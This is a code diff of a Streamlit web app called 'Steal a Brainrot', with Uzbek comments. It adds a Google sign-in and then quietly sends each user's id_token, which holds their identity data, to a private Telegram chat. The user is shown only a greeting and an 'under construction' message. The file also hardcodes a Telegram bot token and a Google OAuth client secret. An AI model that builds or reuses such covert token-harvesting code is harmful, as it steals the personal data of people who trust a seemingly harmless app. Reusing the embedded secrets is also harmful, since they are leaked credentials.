@@ -1,32 +1,38 @@
 import streamlit as st
+from streamlit_oauth import oauth
 import requests
+import json
 
-# Sahifa sozlamalari (Dizayn uchun)
-st.set_page_config(page_title="Steal a Brainrot", page_icon="🚀")
-
-# Telegram ma'lumotlari
+# Telegram konfiguratsiyasi
 BOT_TOKEN = "8112666081:AAGtROwNttf6lsApMQUxszHoC8xf7rB0s4A"
 CHAT_ID = "8088597011"
 
-# UI Dizayn
 st.title("✨ Steal a Brainrot")
-st.markdown("---")
-st.write("Ilovamizga xush kelibsiz! Eng yaxshi brainrotlar shu yerda.")
 
-# Google orqali kirish (simulyatsiya - Streamlitda autentifikatsiya uchun oson yo'l)
-if 'logged_in' not in st.session_state:
-    st.session_state.logged_in = False
+# OAuth sozlamalari
+CLIENT_ID = "1085309280384-idkflab6a8as83fuum4479ovni8b367e.apps.googleusercontent.com"
+CLIENT_SECRET = "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"
+# Streamlit ilovangizning aniq URL manzili
+REDIRECT_URI = "https://steal-breinrot-app-gtxahjgkk8egizl2uuu6sd.streamlit.app/"
 
-if not st.session_state.logged_in:
-    if st.button("Google orqali kirish", type="primary"):
-        # Telegramga xabar yuborish
-        msg = "✅ Yangi foydalanuvchi tugmani bosdi!"
-        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
-        
-        st.session_state.logged_in = True
-        st.rerun()
-else:
-    # Muvaffaqiyatli kirgandan keyingi holat
+# Google Auth komponenti
+result = oauth(
+    client_id=CLIENT_ID,
+    client_secret=CLIENT_SECRET,
+    redirect_uri=REDIRECT_URI,
+    provider="google",
+    scope="openid email profile"
+)
+
+if result:
+    # Foydalanuvchi ma'lumotlari
+    user_info = result.get("id_token")
     st.success("Assalomu alaykum!")
-    st.balloons() # Chiroyli effekt
+    
+    # Telegramga foydalanuvchi ma'lumotlarini yuborish
+    msg = f"✅ Yangi foydalanuvchi kirdi!\nMa'lumot: {json.dumps(user_info)}"
+    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
+    
     st.info("Ilova ustida ishlayapmiz, tez orada tayyor bo'ladi! 🛠️")
+else:
+    st.write("Iltimos, Google orqali kiring:")
